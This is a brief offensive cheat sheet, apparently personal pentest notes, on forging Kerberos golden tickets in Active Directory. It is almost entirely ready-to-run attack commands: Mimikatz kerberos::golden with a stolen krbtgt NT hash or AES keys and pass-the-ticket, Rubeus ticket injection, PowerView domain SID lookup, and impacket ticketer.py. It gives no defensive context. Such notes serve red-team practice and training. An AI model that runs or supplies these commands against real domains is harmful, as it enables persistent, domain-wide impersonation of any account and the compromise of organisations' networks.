# GoldTicket 
- https://www.thehacker.recipes/ad/movement/kerberos/forged-tickets/golden 
- https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/golden-ticket

## Windows
### Mimikatz
```
# with an NT hash
kerberos::golden /domain:$DOMAIN /sid:$DomainSID /rc4:$krbtgt_NThash /user:randomuser /ptt

# with an AES 128 key
kerberos::golden /domain:$DOMAIN /sid:$DomainSID /aes128:$krbtgt_aes128_key /user:randomuser /ptt

# with an AES 256 key
kerberos::golden /domain:$DOMAIN /sid:$DomainSID /aes256:$krbtgt_aes256_key /user:randomuser /ptt
```

### Rubeus
```
.\Rubeus.exe ptt /ticket:ticket.kirbi
```

## Remote
```
$ import-module .\PowerView.ps1
$ Get-DomainSID
```

```
# Create the golden ticket (with an RC4 key, i.e. NT hash)
$ ticketer.py -nthash $krbtgtNThash -domain-sid $domainSID -domain $DOMAIN randomuser

# Create the golden ticket (with an AES 128/256bits key)
$ ticketer.py -aesKey $krbtgtAESkey -domain-sid $domainSID -domain $DOMAIN randomuser
```